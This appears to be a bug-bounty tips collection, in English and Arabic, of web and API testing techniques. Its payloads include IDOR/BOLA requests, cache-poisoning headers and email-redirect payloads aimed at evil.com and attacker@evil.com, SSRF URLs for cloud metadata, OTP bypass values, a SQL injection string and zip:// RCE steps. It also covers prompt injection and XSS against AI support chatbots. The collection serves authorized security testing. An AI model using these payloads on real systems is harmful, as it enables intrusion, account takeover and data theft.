Title: Nested / Wrapped Object IDOR — outer validated, inner executed
How It Works: Auth middleware often validates only the top-level key. Business logic then follows nested objects. Send \{"Account": \{"Account": victimId\}\} or deeper nesting. The outer key passes ownership check; the inner value is used for the actual operation. Scanners almost never test this shape.
Payload / Code:
Original: \{"Account": 1111\}
Wrapped: \{"Account": \{"Account": 3333\}\}

Also try:
\{"user": \{"id": victim\}\}
\{"data": \{"object": \{"id": victim\}\}\}
Source: Twitter/X @vuln\_X — Don't just swap IDs — wrap them (May 2026, high engagement)

Title: BOLA via Wildcard / Special ID Values (\*, all, 0, -1, null, empty)
How It Works: Some backends treat special values as "all objects" or skip ownership checks when the ID is not a normal UUID/integer. Replace the object ID with \*, all, any, 0, -1, null, empty string, or undefined. Also try path tricks (../users/victim, trailing / or ?). High impact when it returns mass data or allows mass modification.
Payload / Code:
GET /api/users/\*
GET /api/users/all
GET /api/users/0
GET /api/users/-1
GET /api/users/null
GET /api/users/

Also: id=\*, id\[\], id\[0\]=victim
Source: Twitter/X @yogsec — BOLA via Wildcard & Special ID Values (Nov 2026)

Title: Cache Poisoning via Unkeyed Headers (X-Forwarded-Host / X-Forwarded-Scheme)
How It Works: Inject a header the cache does not key on but the application uses for redirects, absolute URLs, or asset generation (X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL, etc.). If the response is cached with your injected value, subsequent users receive poisoned content (open redirect, XSS, or wrong origin). One request can affect many users.
Payload / Code:
X-Forwarded-Host: [evil.com](http://evil.com)
X-Forwarded-Scheme: http
X-Original-URL: /evil

Then force cache hit and observe Location / script src / link tags reflecting the poisoned host.
Source: Twitter/X @gustavorobertux — Bug Bounty Tip #19/30 Cache poisoning (Nov 2026) + classic PortSwigger patterns

Title: BOLA / IDOR via Batch & Bulk ID Mixing
How It Works: Many APIs expose batch/bulk endpoints that accept arrays of object IDs (ids\[\], JSON array of objects, /api/batch). Authorization is often checked only on the first ID or skipped per-item. Mix your own IDs with a victim ID in the same request; also try duplicate keys, partial-failure responses that leak existence, and array stuffing. If the server processes the victim object, you have scalable BOLA.
Payload / Code:
POST /api/batch
\{"ids": \["your-id", "victim-id"\]\}

or
ids\[\]=your-id&ids\[\]=victim-id

or mixed objects:
\[\{"id":"your-id"\}, \{"id":"victim-id"\}\]
Source: Twitter/X @yogsec — BOLA via Batch/Bulk Request ID Mixing (Nov 2026)

Title: GraphQL Mutation BOLA — test write operations, not only queries
How It Works: Many GraphQL deployments correctly authorize queries but forget the same checks on mutations (update, delete, transfer, assign). Swap the object ID in mutation arguments while keeping a valid session. Also test unauthenticated mutations and batch mutations that mix your objects with victim objects. High impact: change email, role, ownership, or delete other users' data.
Payload / Code:
mutation \{
updateUser(id: "victim-uuid", input: \{email: "[attacker@evil.com](mailto:attacker@evil.com)"\}) \{
id email
\}
\}

Also test:
deleteX(id: "victim")
transferOwnership(from: "victim", to: "you")
batchUpdate(ids: \["you", "victim"\])
Source: Twitter/X AI chat / GraphQL IDOR reports + 2026 hunting notes (mutation ownership frequently weaker than query)

Title: AI Chat / Support Agent — conversationID / session UUID BOLA (unauthenticated or cross-user)
How It Works: AI assistants and support agents assign conversation or session UUIDs. GraphQL/REST resolvers frequently skip ownership and even authentication checks on history/read endpoints. Swap the conversationID (from URL, body, or WebSocket) with another user's; also test completely unauthenticated. Leaks private prompts, PII, booking details, or internal tool actions. Low competition surface in 2026.
Payload / Code:
POST /graphql
\{"query":"query \{ papayaConversationHistory(conversationID: "victim-uuid") \{ messages \} \}"\}

Or REST:
GET /api/chat/history?conversationId=victim-uuid
(without auth header)
Source: Twitter/X @Bug\_Breakdown + @dd\_pwnd — unauthenticated GraphQL IDOR on AI chat history + support agents as attack surface (Nov 2026)

Title: Array-form IDOR — id\[\]=attacker&id\[\]=victim bypass
How It Works: ACL sometimes checks a single scalar id. Sending the same parameter as an array (id\[\]= or id as JSON array) can make the backend iterate and return or act on a second ID without ownership checks. Compare single-id 403 vs array 200 on authorized test objects only.
Payload / Code:
id=attacker\_id → 403
id\[\]=attacker\_id&id\[\]=victim\_id → 200?
id=\[attacker\_id, victim\_id\] (JSON)
Also: ids=1,2 or objects\[0\]\[id\]=victim
Source: Twitter/X IDOR edge-case tips (array/list parameters) + 2026 hunting notes

Title: Disable JavaScript → legacy / forgotten form still live
How It Works: SPA frontends often hide or replace old flows with JS. Turning JS off (or fetching without executing scripts) can expose forgotten HTML forms and endpoints still wired on the server. Bots rarely do this. Use only on authorized targets; document the exact path and impact.
Payload / Code:
Browser: disable JS → reload sensitive flows (password reset, recovery, signup)
curl without following SPA redirects; compare HTML to JS-enabled view
Look for old form actions still posting to live APIs
Source: Twitter/X @dd\_pwnd — Google account recovery with JS off loaded an old form that leaked phone numbers (\$5k, 2025 story retold 2026)

Title: SSRF Magic DNS ([nip.io](http://nip.io) / [xip.io](http://xip.io)) — filter checks string, not resolved IP
How It Works: Many SSRF filters block the literal string 169.254.169.254 or [localhost](http://localhost) but do not re-check after DNS resolution (TOCTOU). Magic DNS providers resolve a hostname that embeds the IP, so the string looks external while the resolved IP is metadata/internal. Confirm with real metadata markers in the body, not status alone. Stay in authorized scope.
Payload / Code:
[http://169.254.169.254.nip.io/latest/meta-data/](http://169.254.169.254.nip.io/latest/meta-data/)
[http://169.254.169.254.xip.io/latest/meta-data/](http://169.254.169.254.xip.io/latest/meta-data/)
[http://127.0.0.1.nip.io/](http://127.0.0.1.nip.io/)
Also: short-TTL DNS rebinding / CNAME of allowlisted-looking host → internal IP
Source: Real full-read SSRF reports (e.g. [169.254.169.254.nip.io](http://169.254.169.254.nip.io) accepted while literal IP blocked) + Twitter SSRF tips 2026

Title: Google / Firebase API key impact — not always Low
How It Works: A leaked browser Google API key is often filed as Low/Informational. Real impact depends on what the key enables. Identity Toolkit / Firebase Auth endpoints may allow account creation if the app trusts email domain without ownership proof. Document capabilities of the key before closing as Low.
Payload / Code:
curl -sk -X POST "[https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=API\_KEY](https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=API_KEY)"
-H "Content-Type: application/json"
-d '\{"email":"[you@company.com](mailto:you@company.com)","password":"Test12345!","returnSecureToken":true\}'
Also check: signInWithPassword, sendOobCode, and restricted API surfaces in Google Cloud Console guidance
Source: Twitter/X Godfather Orwa style tips + Identity Toolkit signup patterns (2025–2026)

Title: OTP / 2FA Bypass via Type Juggling (array / null / object)
How It Works: Endpoints like POST /verify-otp often compare OTP as a string. If the server accepts JSON and does loose comparison or fails open on wrong types, sending the OTP as an array, object, null, or with a null byte can bypass the check. Classic type juggling / fail-open validation. Use only on authorized targets with your own test accounts.
Payload / Code:
\{"otp":"1234"\} → baseline
\{"otp":\["1234"\]\} → array
\{"otp":\{"\$ne":null\}\} → operator-style
\{"otp":null\} → null
"1234%00" → null byte
Also try omitting the field or sending empty string.
Source: Twitter/X @yogsec — Bug Bounty Tip OTP Bypass via Null Byte / Array Injection (Nov 2026)

Title: CSRF token bypass via HTTP method override
How It Works: Some apps only enforce CSRF tokens on POST. Switching method to GET with X-HTTP-Method-Override: POST, or using PUT/DELETE, can skip the token check while the backend still performs the state change. Confirm SameSite and cookie behavior; only test authorized actions on your accounts.
Payload / Code:
Original: POST /change-email with CSRF token
Test: GET /[change-email?email=attacker@x.com](mailto:change-email?email=attacker@x.com)
Header: X-HTTP-Method-Override: POST
Also try: X-HTTP-Method: PUT , \_method=POST form field
Source: Twitter/X @yogsec — CSRF Token Bypass via Method Override (Nov 2026)

Title: WAF URL normalization fail — double encoding & nested paths
How It Works: Some WAFs fail during URL normalization. Double-encoding slashes or inserting nested encoded traversal segments can reach a backend path the WAF thought it blocked. Always compare against a 404 calibration and stay on authorized hosts. Smart 403 in Zero Track now includes these techniques as LEAD probes only.
Payload / Code:
/api/v1/%2e%2e/%2e%2e/config
/path%252fadmin
/%252e%252e%252fsecret
MID inserts: /%2e%2e/ , /%252e%252e/
Source: Twitter/X @Omar\_3lsayed — Bug Bounty Tip WAF URL normalization (Dec 2025 style tips circulating 2026)

Title: Newline injection in JSON parameters (password-reset / email)
How It Works: APIs that accept email or similar fields in JSON may split on newlines when passing values to mailers or downstream parsers. Injecting \\n can create extra headers or dual recipients, leading to password-reset token theft or account takeover. Test carefully on accounts you own.
Payload / Code:
\{"email":"[victim@target.com](mailto:victim@target.com)\\ncc:[attacker@evil.com](mailto:attacker@evil.com)"\}
\{"email":"[victim@target.com](mailto:victim@target.com)\\nbcc:[attacker@evil.com](mailto:attacker@evil.com)"\}
Also try \\r\\n and URL-encoded variants in form fields that become JSON server-side
Source: Twitter/X @zohebxsec — Newline Injection in JSON Parameters (Nov 2026, high engagement)

Title: AI support agents as attack surface (IDOR / BAC / XSS)
How It Works: Companies replace human support with LLM agents that can look up accounts, change details, and issue refunds. Same bug classes with new names: agent shows another user's data = IDOR; agent does admin actions for a normal user = broken access control; unescaped agent output on a page = XSS. Start from OWASP Top 10 for LLM Apps. Prefer two test accounts and clear evidence. Do not auto-confirm from chat text alone.
Payload / Code:
Map support/chat/agent endpoints
Prompt injection to request other-user data (authorized tests only)
Compare agent actions with and without session
Check reflected agent HTML sinks
Source: Twitter/X @dd\_pwnd — support chat is part of the attack surface (Nov 2026); \~\$50k reports mentioned with low competition

Title: X-Forwarded-Host open-redirect style host poisoning (JS/asset redirect chains)
How It Works: بخلاف password-reset Host injection المعروف، بعض الـCDNs/الـapps تبني absolute URLs لملفات JS أو redirects من X-Forwarded-Host. جرّب تسلسل hostnames (target، [sub.target](http://sub.target)، nested) وراقب Location وContent-Location وروابط السكربت. الأثر القوي: تسميم سكربت يُحمَّل من أصل موثوق أو سرقة OAuth redirect.
Payload / Code:
X-Forwarded-Host: [target.com](http://target.com)
X-Forwarded-Host: [sub1.target.com](http://sub1.target.com)
X-Forwarded-Host: [sub2.sub1.target.com](http://sub2.sub1.target.com)
Also try: Forwarded: host=attacker.tld
Observe whether static/JS responses rewrite absolute URLs to attacker host.
Source: dk4trin reply on X-Forwarded-Host bypass chain

Title: WAF bypass via URL normalization: double encoding and nested paths
How It Works: بعض الـWAFs تفحص الشكل الأول من الـURL بينما الـbackend يفك الترميز مرتين أو يطبّع المسارات بشكل مختلف. Double encoding وnested path traversal قد يمرّان الفلتر ويصلان للتطبيق. اختبر فقط على أهداف مصرّح بها وقارن سلوك WAF مقابل origin.
Payload / Code:
Double encoding example:
/api/v1/%252e%252e/%252e%252e/config
id=1%2520UNION%2520SELECT%2520secrets--

Nested / unusual paths:
/api/v1/....//....//config
/api/v1;/admin
Always confirm backend executed the decoded form, not just different WAF status.

Title: Re-test after "Resolved" — regressions and silent reintroductions
How It Works: بعد إغلاق تقرير، الفرق أحيانًا تعيد كودًا قديمًا أو تصلّح مسارًا وتترك bypass. أعد نفس الـPoC بعد أسابيع على نفس النطاق المصرّح؛ لو عاد الخلل فهو تقرير regression جديد بأدلة حديثة.
Payload / Code:
Keep a private checklist of resolved PoCs per program.
Re-run exact steps + one common bypass variant after patch notes or 30–60 days.

Title: Escalate the finding: SSRF→RCE, Self-XSS→Clickjacking/CSRF, misconfig chains
How It Works: البلاغ بـP3 ضعيف غالبًا لأن السلسلة توقفت مبكرًا. فكّر في التصعيد داخل النطاق فقط: SSRF قد يصل لـmetadata/internal admin؛ Self-XSS قد يصبح قابل للاستغلال عبر clickjacking أو CSRF إذا وُجدت نقطة إقناع الضحية؛ Directory listing → configs → internal hosts → SSRF → path traversal → admin API → secrets. وثّق كل حلقة بدليل منفصل ووقف عند الحد المصرّح.
Payload / Code:
Chain checklist (authorized scope only):
Directory Listing → Exposed Configs → Internal Host Discovery → SSRF → Path Traversal → Internal Admin API → Secrets
Don't report SSRF alone if internal RCE/metadata is reachable
Don't report Self-XSS alone if clickjacking/CSRF can deliver it
Don't report Self-Stored XSS alone if CSRF can trigger it

Title: Zip upload path traversal → RCE via zip:// wrapper
How It Works: لو التطبيق يقبل رفع ZIP ويعالج مسارات داخل الأرشيف أو يدعم wrappers مثل zip://، قد تنفّذ ملف PHP/الكود عبر مسار نسبي داخل الأرشيف. الشروط: رفع مسموح + تضمين/قراءة مسار يتحكم به المهاجم. اختبر على بيئات مصرّح بها فقط وبملف إثبات غير ضار أولًا.
Payload / Code:
1) Create rce.php (harmless marker preferred)
2) Zip it → [file.zip](http://file.zip)
3) Upload to vulnerable endpoint
4) Trigger inclusion if supported:
[https://target/index.php?page=zip://path/to/file.zip%23rce.php](https://target/index.php?page=zip://path/to/file.zip%23rce.php)
Also test path traversal filenames inside zip (../) against extract-to-webroot bugs.
Source: Awais Nazeer tip (X) — zip upload to RCE

Title: AWS tip: probe /ramp\_core.js for embedded AccessKey material
How It Works: بعض تطبيقات/SDK قديمة أو حزم front-end تضع مسارات ثابتة فيها مفاتيح أو config. إضافة /ramp\_core.js (ومسارات مشابهة من wordlists السحابية) لمرحلة content discovery قد تكشف AccessKeyId/Secret في JS. المفتاح وحده يحتاج إثبات صلاحية وتأثير داخل النطاق قبل البلاغ.

Add to content wordlist:
/ramp\_core.js
/.aws/credentials
/config.json
/aws-config.js

Title: Exposed Google Maps API keys may unlock Gemini — validate model access not just Maps
How It Works: بعض مفاتيح Google Maps (AIza…) المنشورة في JS قد تكون مربوطة بمشروع Cloud فيه Gemini/Generative Language مفعّل بدون قيود كافية. وجود المفتاح وحده ليس ثغرة؛ الأثر يبدأ عندما يثبت أن نفس المفتاح يستدعي models أو يتجاوز referrer/API restrictions. ابحث في: JS/source maps، Wayback، Android APKs، web assets. بعد الاستخراج اختبر فقط على نطاق مصرّح ووثّق الـAPI المفعّلة والقيود (HTTP referrer، IP، API restrictions) قبل أي بلاغ.

Hunt sources: JS bundles, .[js.map](http://js.map), waybackurls, APK strings.
Pattern: AIza\[0-9A-Za-z\_-\]\{35\}
Validate impact (authorized only): try Generative Language / Gemini endpoints if program allows; check Maps quotas vs other Google APIs; document restriction bypass evidence.

Title: NXDOMAIN + dangling DNS → subdomain takeover candidates
How It Works: سجلات DNS التي تنحل إلى NXDOMAIN أو CNAME لخدمات متروكة مرشحة لـtakeover. فرّق بين NXDOMAIN الحقيقي وخدمة لا تزال مملوكة للبرنامج. استخدم قوائم can-i-take-over-xyz قبل أي ادعاء، وأثبت التحكم في السجل فقط ضمن قواعد البرنامج.

subfinder -d [target.com](http://target.com) -silent \| dnsx -a -resp \| grep -i NXDOMAIN
# Also: httpx live check + fingerprint against known vulnerable services
# Validate with: [github.com/EdOverflow/can-i-take-over-xyz](http://github.com/EdOverflow/can-i-take-over-xyz) labels Vulnerable / Edge case
Source: Fardeen A. tip (X) — subfinder \| dnsx NXDOMAIN

Title: Web cache poisoning via malformed Cookie parameter
How It Works: بعض الـcaches تُدخل قيم Cookie غير صالحة في مفتاح الكاش أو تتعامل معها بشكل مختلف عن origin. جرّب Cookie مشوّه/مكرر/بقيم خاصة وراقب Cache-Control وVary وX-Cache وهل المحتوى المسموم يُخدم لمستخدم آخر. التأثير الحقيقي = تسميم استجابة مشتركة لمستخدمين آخرين، مش اختلاف رد لنفسك فقط.
Payload / Code:
Try malformed Cookie shapes (authorized targets):
Cookie: =
Cookie: name=
Cookie: name=""
Cookie: ;;;;;;;;
Cookie: a=b
Compare responses + cache headers between poisoned and clean clients.
Confirm unauthenticated victim receives poisoned page before reporting.

Title: AI support chatbot that renders model output in DOM → XSS → session theft / ATO
How It Works: شركات كثيرة تضيف chatbot دعم بدون تدقيق مخرجات النموذج. لو البوت يفك payload (base64/URL-decode) ويعرض الناتج في DOM بدون sanitization، تحصل على XSS مخزّن أو منعكس عبر قناة المحادثة. سلسلة شائعة: XSS → سرقة cookies/tokens أو OAuth cookie-downgrade → account takeover. القاعدة: أي مخرجات LLM تُرسَم في الصفحة = سطح هجوم. اختبر على برامج مصرّح بها فقط، بأدلة (request/response + DOM proof) من غير إضرار بالمستخدمين.
Payload / Code:
1) Find in-scope AI/chat/support endpoints
2) Send encoded XSS (base64, HTML entities, markdown that becomes HTML)
3) Confirm bot decodes and DOM reflects/executes
4) Escalate only with proof: cookie access, token leak, or auth action in same origin
Heuristic: "If it renders in the DOM, treat it as injectable until proven sanitized."
Source: Patrickbatman writeup tip (X) — AI bot decoded base64 XSS into DOM

Title: Wayback → private emails / JWTs from historical URLs
How It Works: الأرشيف التاريخي يحتفظ بمسارات فيها إيميلات داخلية أو JWTs في query/fragment/body قديمة. مش كل نتيجة ثغرة؛ صنّف كـ information disclosure فقط لو البيانات حساسة وما زالت صالحة أو تكشف هيكل داخلي مفيد. اربط النتائج بالنطاق المصرّح وامسح التكرار قبل البلاغ.
Payload / Code:
# Private-looking emails from historical surface
cat subs.txt \| waybackurls \| grep -Ei 'gmail\|@\[a-z0-9.-\]+.(com\|io\|net)' \| tee emails\_wayback.txt

# JWTs in archived URLs
cat urls.txt \| grep -Eo 'eyJ\[A-Za-z0-9\_-\]+.\[A-Za-z0-9\_-\]+.\[A-Za-z0-9\_-\]+' \| sort -u

Title: Basic Auth cancel spam — intermittent auth bypass on some panels
How It Works: في بعض لوحات login القديمة، إلغاء نافذة Basic Auth عدة مرات قد يُسقط الجلسة إلى حالة authenticated أو يكشف محتوى محمي بسبب خطأ في منطق التحدي. نادر وغير مضمون؛ وثّق بدقة إن نجح ولا تعتمد عليه كمنهج أساسي.
Payload / Code:
Open protected path → browser Basic Auth prompt → Cancel 3–4 times → observe whether body/admin UI leaks.
Prefer reproducing with raw HTTP (empty Authorization / repeated 401 handling) for a clean PoC.
Source: mahmoud tip (X) — cancel basic auth 3–4 times

Title: Next.js Middleware / Proxy — dynamic route parameter injection can bypass path checks
How It Works: In affected Next.js versions, specially crafted query parameters could alter a dynamic route parameter as interpreted by the page while the visible URL path remained unchanged. Applications relying only on Middleware/Proxy path matching to protect dynamic routes could therefore render protected content without the expected check. The advisory applies to affected versions and route configurations, not every Next.js deployment.
Payload / Code: In an authorized test app with a dummy protected dynamic route, compare the middleware's route/parameter interpretation with the page's final parameter and its own authorization decision. Change only the query parameter representation and verify whether the page independently enforces access. Use test data and confirm impact through the application's authorization behavior. Affected ranges listed by the advisory: Next.js 15.4.x before 15.5.16 and 16.0.x before 16.2.5; upgrade to a fixed release.

Title: Authorization path parser differential — encoded semicolon, slash, and backslash
How It Works: A security layer and a resource handler may normalize or decode path components differently. Quarkus documented path-based authorization bypass conditions involving encoded semicolons (%3B) and encoded slashes (%2F) or backslashes (%5C), depending on the protected resource and affected version. The reusable primitive is to compare the path representation used by the policy engine with the final handler/resource selected.
Payload / Code: Only in an authorized lab or explicitly in-scope target, start with a known protected test route and a negative control. Change one representation at a time: encoded semicolon, encoded slash, or encoded backslash. Compare policy decision, resolved route, and actual access. Do not treat a 200 response alone as proof; confirm protected content or a state change without exposing real data. Check affected versions and vendor fixes before testing.

Title: Middleware vs Router URL Normalization — test duplicate slashes and semicolon delimiters
How It Works: When a router normalizes a path but path-scoped authentication middleware receives the original representation, the two layers can disagree about which route is being requested. In affected @fastify/express versions, duplicate slashes or semicolon delimiters could cause middleware to be skipped when the corresponding Fastify normalization options were enabled. This depends on the stack and configuration; do not assume every app is vulnerable.
Payload / Code: In a permitted test environment, identify the framework, adapter, versions, and active normalization options. Compare a benign protected route using its canonical path with controlled variants containing duplicate slashes or a semicolon delimiter. Record the router's resolved route and whether the auth middleware ran. Confirm actual protected-resource access, not just a different status code. Advisory: affected \<=4.0.4; fixed in 4.0.5.

Title: Moby / Docker AuthZ — oversized request body omitted before policy evaluation
How It Works: A Docker Engine authorization plugin may evaluate a request without the body when a specially crafted oversized API request triggers the condition. If the policy decision depends on body fields, the plugin may allow a request it would deny when seeing the complete body. This affects deployments using AuthZ plugins that inspect request bodies; it is not a generic Docker API bypass.
Payload / Code: Research lead for an explicitly authorized Docker lab only: compare the exact same harmless API operation with a normal body and a boundary/oversized body while logging what the authorization plugin actually receives and decides. Do not test production daemons or send disruptive oversized requests without explicit permission. Confirm the plugin's input and policy decision, not just an HTTP status. Fixed in Docker Engine 29.3.1.

Title: follow-redirects — regex metacharacters in sensitiveHeaders may evade stripping
How It Works: The sensitiveHeaders option introduced in follow-redirects 1.16.0 builds a regular expression from configured header names, but the escaping routine omitted some metacharacters. Valid header names containing characters such as \^ or \| could therefore fail to match the intended name and not be stripped on a cross-origin redirect. Fixed in 1.16.1.
Payload / Code: In a local two-origin test, configure a harmless canary header name containing a supported token metacharacter and mark it sensitive. Trigger a cross-origin redirect and verify whether the header is removed. Use only test values; do not attempt to extract credentials from live services. Distinguish this option-specific issue from the separate array-form header handling issue.

Title: follow-redirects — array-form headers can bypass cross-origin credential stripping
How It Works: In follow-redirects 1.16.0, sensitive-header removal iterated headers as though they were a plain object. Node also accepts an array of alternating header names and values; in that form, iteration sees numeric indices, so cross-host stripping can silently fail and forward Authorization/Cookie/Proxy-Authorization or configured sensitive headers. Fixed in 1.16.1.
Payload / Code: In a local test with two HTTP(S) origins you control, send a harmless canary credential header through a redirect from origin A to origin B. Compare object-form and array-form headers and inspect what B receives. Never use real credentials or a third-party redirect target. Check the installed dependency version and confirm the redirect crosses hosts or downgrades protocol.

Title: gRPC-Go — non-canonical HTTP/2 :path bypasses path-based deny rules
How It Works: Affected gRPC-Go versions accepted an HTTP/2 :path without the required leading slash for routing, while path-based authorization interceptors evaluated the non-canonical path. Deny rules for canonical paths could therefore fail when a fallback allow rule existed. The affected setup requires path-based authorization and this policy shape; this is not a universal gRPC bypass.
Payload / Code: In an authorized test server using an affected version, compare canonical and non-canonical :path representations for a harmless test method. Inspect the router's selected handler and the authorization interceptor's observed method/path. Verify whether the deny rule actually blocks the request; never send malformed raw HTTP/2 frames to third-party systems. Fixed in gRPC-Go 1.79.3.

Title: n8n shared OAuth credential reconnect — read permission must not authorize token replacement
How It Works: Affected OAuth reconnect endpoints authorized the operation with credential:read rather than credential:update. A read-only user of a shared credential could initiate reconnect and replace its stored token material with a token for an external account they controlled, changing the identity used by workflows. The core primitive is an authorization-level mismatch between viewing a credential and mutating its linked identity.
Payload / Code: In an authorized lab with a shared dummy OAuth credential, compare a read-only member's ability to view the credential versus reconnect/update it. Confirm whether the stored provider identity changes and whether workflows use the new identity; do not touch real shared credentials or send data to external accounts. The advisory lists fixes in 1.123.43, 2.20.7, and 2.21.1.

Title: Casdoor — token exchange must bind JWT identity to the target organization
How It Works: The reported Casdoor issue involved token exchange validating a JWT signature without verifying that the token's user belonged to the same organization as the target application. A valid token from one organization could cross an organization boundary if the missing binding check and affected versions were present.
Payload / Code: For an authorized lab with two test organizations and accounts, test whether token exchange enforces both signature validity and organization/tenant membership. Use only test identities and non-sensitive scopes; record the subject, issuer, organization, target app, and resulting permissions. Do not replay real users' tokens. Advisory says affected versions were fixed in 2.387.0.

Title: Angular HttpClient — URL parsing discrepancy may leak XSRF tokens
How It Works: Angular's HTTP client had an XSRF token leakage issue related to a URL-parsing discrepancy, described as an incomplete fix for CVE-2025-66035. The useful testing pattern is to compare how the framework classifies a request URL against how the browser/network layer resolves the final destination; token attachment must follow the intended same-origin policy.
Payload / Code: In a local app using an affected Angular version, test only controlled same-origin and cross-origin URLs and observe whether the XSRF header is attached to a request that resolves cross-origin. Use a dummy token and a local receiver; do not collect real anti-CSRF tokens from production users. Read the advisory for affected/fixed versions and upgrade guidance.

Title: n8n OAuth callback — bind the completing browser session to the flow initiator
How It Works: The reported Enterprise issue allowed an OAuth2 credential callback to complete without requiring the browser to be authenticated as the user who initiated the dynamic-credential connect flow. If another person completed the provider consent, their tokens could be stored under the initiating member's identity. This is distinct from checking OAuth state alone: the callback must also preserve the intended user/browser binding.
Payload / Code: In a lab or explicitly authorized n8n Enterprise test with two controlled accounts and a test OAuth provider, start a dynamic-credential connect flow as Account A, then verify that completion is rejected when performed in an unrelated browser/session for Account B. Use a dummy provider and revoke test tokens afterward. Do not trick real users into authorizing a flow. The advisory lists fixes in 2.46.1, 2.45.5, and 3.0.1.

Title: Path policy vs execution parser: compare both views
How It Works: When a gateway/security layer and the final router decode or normalize a path differently, the first layer may authorize one representation while the second executes another. Compare the two views and prove the final resource reached.
Payload / Code: Use only inside a lab or explicitly authorized target. Mutate one representation at a time: encoded semicolon, encoded slash/backslash, and double-encoding; verify the final route/resource, not just the status code.

Title: Treat negative parser cases as evidence
How It Works: A strong differential test records which variants do not work and why. This prevents turning every encoding mutation into a false positive and helps identify the exact boundary where parser views diverge.
Payload / Code: For each variant, record: security-layer interpretation, routing-layer interpretation, final resource, and observed side effect. Include confirmed non-exploitable cases.

Title: Separate read access from state-changing authorization
How It Works: Authorization that permits reading an object does not imply permission to mutate it. Test GET/PUT/PATCH/POST/DELETE or GraphQL mutations separately and verify the state change from an independent view.
Payload / Code: Use two accounts you own and a harmless test object in a lab. Change one non-sensitive field, then verify from the second account or an independent audit/log view.

Title: WSDL / SOAP Service Discovery + 403 Differential Fuzzing Across Authorized Hosts
How It Works: الفكرة: لو endpoint بيرجع 403، ما تعتبرش ده نهاية الاختبار ولا دليل على وجود ثغرة. في الخدمات القديمة أو المؤسسية، افحص هل الخدمة SOAP وهل وصفها متاح عبر WSDL، ثم قارن سلوك الـ endpoint على الدومينات والـ virtual hosts المصرح بها. اختلاف الاستجابة قد يكشف إعدادات غير متسقة أو سطح API قديم، لكنه لا يثبت تجاوز صلاحيات وحده.
Payload / Code:
أمثلة آمنة على صيغة المسارات للفحص داخل النطاق المصرح فقط:
- /service?wsdl
- /service?WSDL
- /service.wsdl

اختبر GET أولًا، ثم قارن OPTIONS أو HEAD عند ملاءمتها وضمن قواعد البرنامج. سجّل status code وLocation وContent-Type وحجم/بصمة الاستجابة. قارن بين hostnames المصرح بها فقط مع إبقاء المسار والطلب ثابتين. لا ترسل SOAP operations تغيّر بيانات أو تنفّذ إجراءات.
Source: Screenshot shared by user — Abdulrhman A Saad; original post URL not visible in screenshot

Title: SSRF / Request Parsing — leading-slash and request-target differences
How It Works: Some clients, proxies, or backends parse request targets differently. A leading slash or alternate request-target form can change routing in certain stacks, but the syntax difference alone is not a vulnerability and must not be treated as a universal bypass.
Payload / Code: In an authorized lab or explicitly approved SSRF test, compare one request-format variable at a time and observe only a harmless, controlled callback or expected route. Record the exact client/proxy/backend behavior. Do not probe internal IPs, cloud metadata, or sensitive services unless the program explicitly authorizes that exact testing.
Source: User-provided Orwa screenshot: request-target slash nuance; normalized as a hypothesis, not a confirmed universal technique

Title: Google API Key / Firebase Identity Toolkit — verify real auth impact, not key presence
How It Works: A browser-visible Google API key is often an intended public identifier. Risk appears only if the associated Firebase/Identity Toolkit configuration or application authorization logic permits an unintended security-relevant action. A domain-based signup assumption is not proof of email ownership or authorization.
Payload / Code: Review the app's documented signup flow and Firebase/Identity Toolkit configuration using only an owned test account and explicitly authorized scope. Check whether email verification is required where the product relies on it, and whether server-side access checks actually enforce the intended domain/role policy. Do not attempt access to other users' records or use exposed keys for unrelated services.
Source: User-provided screenshot / Orwa-style research note; validation criteria normalized

Title: Client-side role / isAdmin / price tampering — verify server-side enforcement
How It Works: Changing client-side values such as isAdmin, role, isAuthenticated, or price matters only if the server trusts them when authorizing an action or calculating a security-sensitive value. UI-only changes are not proof of a vulnerability.
Payload / Code: With an explicitly authorized test account and test data, compare the normal request with a controlled change to a client-controlled field. Verify server-side behavior using only actions and records you own. Do not modify real purchases, payments, roles, or other users' data.
Source: User-provided screenshot: response manipulation / role and price fields; normalized into a server-side authorization check

Title: Azure Application Gateway v2 — 403 Query String Extension Bypass (Unverified)
How It Works: Reported observation from an X post: a restricted URL returns HTTP 403, but adding a query parameter whose value contains the literal string .js (example: ?x=.js) reportedly changes the response and may allow access to the resource. The author suspects a Microsoft Azure Application Gateway v2 filtering/parsing behavior and says the cause is still being investigated. This is an unverified hypothesis, not a confirmed general bypass. Possible class to investigate: disagreement between gateway/WAF URL inspection and downstream application or routing interpretation of the query string.
Payload / Code:
Baseline: [https://authorized-target.example/restricted-path](https://authorized-target.example/restricted-path)
Comparison variant: [https://authorized-target.example/restricted-path?x=.js](https://authorized-target.example/restricted-path?x=.js)

Only replace the placeholder with a target explicitly in scope. Compare status, redirect chain, response headers, body length/hash, and whether the actual protected resource is returned. Do not treat HTTP 200 alone as proof; check for a block page, login page, or generic error.

Title: Last-step authorization check in multi-step flows
How It Works: لو flow فيه preview ثم confirm أو create ثم commit، ما تفترضش إن check اللي حصل في أول خطوة اتنقل للخطوة الأخيرة. راقب آخر request مباشرة واختبره بحساب أقل صلاحية داخل لاب أو برنامج مصرح.
Payload / Code: Compare the final commit request under the intended role and a lower-privileged test role. Stop at authorization proof; don't mutate real third-party data.

Title: Authorization test: swap the target, not the session
How It Works: في أي request authenticated، افصل بين هوية الـsession وبين object ID الموجود في الـpath/body. جرّب نفس session مع object تاني تملكه أنت. الهدف إثبات إن السيرفر بيربط القرار بالـsubject الصحيح، مش بمجرد إن المستخدم logged in.
Payload / Code: Safe lab idea: Account A session + Account B test object ID. Change only a harmless field such as nickname. Confirm the change from Account B.

Title: 200 OK is not proof of BOLA
How It Works: الـstatus code لوحده مش finding. لازم تثبت إن response رجّع object مختلف أو إن state اتغيّر فعلاً. قارن body/headers/length، وبعدها اعمل verification من مالك object في حساب تاني تملكه.
Payload / Code: Use a harmless canary value in a lab and verify it from the second controlled account. Treat redirects, generic success JSON, and identical empty bodies as inconclusive.

Title: AWS App Recon Chain → Cognito Identifiers, S3 / DNS / Deployment Artifact Exposure (\$10K Case)
How It Works: A 2025 Medium writeup reports a \$10,000 bounty for an AWS configuration issue found while reviewing app client code and auth/file-management traffic. A Cognito pool identifier led to correlation of publicly readable cloud resources and deployment artifacts, exposing S3, DNS ranges and infrastructure metadata. The writeup says the researcher used passive discovery and read-only checks; payout is self-reported. The value is the correlation chain, not treating a public identifier as a secret.
